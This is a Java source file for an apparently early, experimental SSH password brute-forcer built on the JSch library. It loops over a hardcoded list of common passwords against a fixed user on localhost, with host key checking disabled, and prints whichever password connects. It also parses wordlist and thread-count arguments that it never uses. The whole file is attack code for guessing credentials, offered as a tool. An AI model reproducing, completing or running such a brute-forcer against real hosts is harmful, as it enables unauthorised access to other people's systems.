package solirs.sshbrutewj;

import com.jcraft.jsch.*; //SSH library


public class Main
{
    private static String wordlistPath;
    private static int threadCount;

    public static void parseargs(String wordlist, int Threads){

        wordlistPath = wordlist;
        threadCount = Threads;
        System.out.println("Wordlist" + wordlistPath);
        System.out.println("Thread count" + threadCount);

    }

    public static void sshbrute() throws JSchException{

        //This is an experimental engine for the bruteforcer.

        String passes[] = {"helloworld", "test", "0000", "4444","P4ssw0rd"};

        int i;
        JSch jsch = new JSch(); //Initialize jsch and the config
        jsch.setConfig("StrictHostKeyChecking", "no"); //Disable StrictHostKeyChecking since it causes issues with the ssh connection.

        String user = "username";

        int port = 22;
        



        for (i = 0; i < passes.length ; i++){

            try{
                //Try to connect with the password, if it works exit and print the password.


                System.out.println("Trying "+ passes[i]);
                Session session=jsch.getSession(user, "localhost", port);

                session.setTimeout(100);
    
                session.setPassword(passes[i]);
                session.connect();
                System.out.println("CONNECTED " + "Password is " + passes[i]);
                System.exit(0);
                
            }catch(Exception e){
                //Continue if the password is wrong
                continue;
            }

        }

    }

    public static void main( String[] args )
    {
        parseargs(args[0], Integer.parseInt(args[1]));


        System.out.println(wordlistPath);
        System.out.println(threadCount);

        //It all starts here
        System.out.println("Starting...");

        try{
            sshbrute();

        } catch(Exception j){
            System.out.print(j);
        }
    }
}
